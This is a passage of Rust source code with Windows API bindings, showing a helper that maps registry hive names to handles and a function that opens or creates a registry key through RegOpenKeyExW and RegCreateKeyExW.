        pub fn CloseServiceHandle(handle: SC_HANDLE) -> BOOL;
    }

    /// The hive a name stands for.
    pub fn hive(name: &str) -> Option<HKEY> {
        match name.to_ascii_uppercase().as_str() {
            "HKLM" | "HKEY_LOCAL_MACHINE" => Some(HKEY_LOCAL_MACHINE),
            "HKCU" | "HKEY_CURRENT_USER" => Some(HKEY_CURRENT_USER),
            _ => None,
        }
    }

    /// Open (and optionally create) a key.
    pub fn open_key(
        hive_name: &str,
        key: &str,
        access: DWORD,
        create: bool,
    ) -> Result<HKEY, String> {
        let hive = match hive(hive_name) {
            Some(h) => h,
            None => return Err(format!("unknown hive {hive_name}")),
        };
        let subkey: Vec<u16> = key.encode_utf16().chain(std::iter::once(0)).collect();
        let mut handle: HKEY = std::ptr::null_mut();
        let status = if create {
            unsafe {
                RegCreateKeyExW(
                    hive,
                    subkey.as_ptr(),
                    0,
                    std::ptr::null(),
                    0,
                    access,
                    std::ptr::null(),
                    &mut handle,
                )
            }
        } else {
            unsafe { RegOpenKeyExW(hive, subkey.as_ptr(), 0, access, &mut handle) }
        };
        if status != 0 {
            return Err(format!("the key could not be opened ({status})"));
        }
        Ok(handle)
    }
}
